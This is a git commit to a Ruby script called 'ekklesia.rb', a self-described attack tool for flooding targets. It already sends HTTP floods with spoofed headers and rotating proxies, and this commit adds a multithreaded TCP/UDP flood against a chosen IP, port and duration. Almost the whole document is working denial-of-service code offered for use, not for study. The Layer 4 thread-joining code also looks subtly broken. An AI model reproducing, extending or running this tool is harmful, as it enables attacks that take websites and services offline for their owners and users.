253be8e133ac6faa9019338982d1469aa795b12a
Bonny le Sage <bonnyjaphet2035@gmail.com>
2024-12-10 20:05:45 +0100

    Update ekklesia.rb

--- ekklesia.rb
+++ ekklesia.rb
@@ -2,6 +2,7 @@ require 'net/http'
 require 'uri'
 require 'optparse'
 require 'thread'
+require 'socket'
 
 # ANSI color codes for styling
 def green_bold(text)
@@ -22,9 +23,7 @@ def banner
 end
 
 # Display attack details banner
-def attack_details_banner(url, threads, requests_per_thread, proxy_enabled, method, delay)
-  status_check_url = "https://check-host.net/check-ping?host=#{url}"
-
+def attack_details_banner(url, threads, requests_per_thread, proxy_enabled, method, delay, layer)
   puts green_bold("===========================================")
   puts green_bold("           Ekklesia - Attack Details        ")
   puts green_bold("===========================================")
@@ -37,11 +36,23 @@ def attack_details_banner(url, threads, requests_per_thread, proxy_enabled, meth
   puts green_bold("Proxy:      #{proxy_enabled ? 'Yes' : 'No'}")
   puts green_bold("Method:     #{method}")
   puts green_bold("Delay:      #{delay}ms between requests")
-  puts green_bold("Check Status: #{status_check_url}")
+  puts green_bold("Layer:      #{layer}")
   puts green_bold("===========================================")
 end
 
-# Send requests with randomized headers
+# Generate randomized headers for Layer 7
+def generate_headers
+  {
+    "User-Agent" => "Mozilla/#{rand(5..10)}.0 (Windows NT #{rand(6..10)}.#{rand(0..3)}) Gecko/#{rand(20100101..20221231)} Firefox/#{rand(50..100)}",
+    "Accept" => "*/*",
+    "Accept-Encoding" => "gzip, deflate",
+    "Connection" => "keep-alive",
+    "Referer" => "https://google.com/search?q=#{rand(1000)}",
+    "X-Forwarded-For" => "#{rand(1..255)}.#{rand(1..255)}.#{rand(1..255)}.#{rand(1..255)}"
+  }
+end
+
+# Layer 7: Send HTTP/HTTPS requests
 def send_request(url, method, proxy = nil, headers = {})
   uri = URI.parse(url)
   http = Net::HTTP.new(uri.host, uri.port)
@@ -73,25 +84,43 @@ def send_request(url, method, proxy = nil, headers = {})
   end
 end
 
-# Generate randomized headers
-def generate_headers
-  {
-    "User-Agent" => "Mozilla/#{rand(5..10)}.0 (Windows NT #{rand(6..10)}.#{rand(0..3)}) Gecko/#{rand(20100101..20221231)} Firefox/#{rand(50..100)}",
-    "Accept" => "*/*",
-    "Accept-Encoding" => "gzip, deflate",
-    "Connection" => "keep-alive",
-    "Referer" => "https://google.com/search?q=#{rand(1000)}",
-    "X-Forwarded-For" => "#{rand(1..255)}.#{rand(1..255)}.#{rand(1..255)}.#{rand(1..255)}"
-  }
+# Layer 4: TCP/UDP Flood
+def flood_layer4(target_ip, target_port, protocol, threads, duration)
+  puts green_bold("[+] Starting Layer 4 attack on #{target_ip}:#{target_port} with protocol #{protocol.upcase}")
+  end_time = Time.now + duration
+
+  threads.times do
+    Thread.new do
+      while Time.now < end_time
+        begin
+          case protocol.downcase
+          when "tcp"
+            socket = TCPSocket.new(target_ip, target_port)
+            socket.write("FloodData#{rand(1000)}")
+            socket.close
+          when "udp"
+            socket = UDPSocket.new
+            socket.send("FloodData#{rand(1000)}", 0, target_ip, target_port)
+            socket.close
+          else
+            raise red_bold("[!] Unsupported protocol: #{protocol}")
+          end
+        rescue => e
+          puts red_bold("[!] Error: #{e.message}")
+        end
+      end
+    end
+  end.each(&:join)
+
+  puts green_bold("[+] Layer 4 attack completed.")
 end
 
-# Perform the stress test
-def stress_test(url, threads, requests_per_thread, proxies, method, delay)
+# Perform the stress test for Layer 7
+def stress_test_layer7(url, threads, requests_per_thread, proxies, method, delay)
   thread_pool = []
 
   threads.times do
     thread_pool << Thread.new do
-      # Each thread gets its own proxy cycle
       proxies_cycle = proxies.cycle if proxies.any?
 
       requests_per_thread.times do
@@ -109,7 +138,7 @@ def stress_test(url, threads, requests_per_thread, proxies, method, delay)
   end
 
   thread_pool.each(&:join)
-  puts green_bold("[+] Stress test completed.")
+  puts green_bold("[+] Layer 7 stress test completed.")
 end
 
 # Parse command-line options
@@ -117,7 +146,7 @@ options = {}
 OptionParser.new do |opts|
   opts.banner = "Usage: ruby ekklesia.rb [options]"
 
-  opts.on("-u", "--url URL", "Target URL") do |url|
+  opts.on("-u", "--url URL", "Target URL or IP") do |url|
     options[:url] = url
   end
 
@@ -133,18 +162,34 @@ OptionParser.new do |opts|
     options[:proxy_file] = proxy_file
   end
 
-  opts.on("-m", "--method METHOD", "HTTP method to use (GET, POST, HEAD, etc.)") do |method|
+  opts.on("-m", "--method METHOD", "HTTP method to use for Layer 7 (GET, POST, HEAD, etc.)") do |method|
     options[:method] = method
   end
 
-  opts.on("-d", "--delay DELAY", Integer, "Delay between requests in milliseconds (default: 100)") do |delay|
+  opts.on("-d", "--delay DELAY", Integer, "Delay between requests in milliseconds for Layer 7 (default: 100)") do |delay|
     options[:delay] = delay
+  end
+
+  opts.on("-l", "--layer LAYER", Integer, "Layer of attack: 4 (Transport Layer), 7 (Application Layer)") do |layer|
+    options[:layer] = layer
+  end
+
+  opts.on("--protocol PROTOCOL", "Protocol to use for Layer 4 (TCP, UDP)") do |protocol|
+    options[:protocol] = protocol
+  end
+
+  opts.on("--port PORT", Integer, "Port to target for Layer 4") do |port|
+    options[:port] = port
+  end
+
+  opts.on("--duration DURATION", Integer, "Duration of Layer 4 attack in seconds") do |duration|
+    options[:duration] = duration
   end
 end.parse!
 
 # Validate input
 if options[:url].nil?
-  puts red_bold("[!] Error: Target URL is required.")
+  puts red_bold("[!] Error: Target URL/IP is required.")
   exit
 end
 
@@ -154,6 +199,10 @@ requests_per_thread = options[:requests] || 100
 proxy_file = options[:proxy_file]
 method = options[:method] || "GET"
 delay = options[:delay] || 100
+layer = options[:layer] || 7
+protocol = options[:protocol] || "tcp"
+port = options[:port] || 80
+duration = options[:duration] || 60
 
 # Load proxies if provided
 proxies = []
@@ -171,5 +220,13 @@ end
 
 # Main script logic
 banner
-attack_details_banner(url, threads, requests_per_thread, proxy_enabled, method, delay)
-stress_test(url, threads, requests_per_thread, proxies, method, delay)
+attack_details_banner(url, threads, requests_per_thread, proxy_enabled, method, delay, layer)
+
+if layer == 7
+  stress_test_layer7(url, threads, requests_per_thread, proxies, method, delay)
+elsif layer == 4
+  target_ip = URI.parse(url).host rescue url # Extract IP from URL
+  flood_layer4(target_ip, port, protocol, threads, duration)
+else
+  puts red_bold("[!] Invalid layer specified. Choose 4 or 7.")
+end
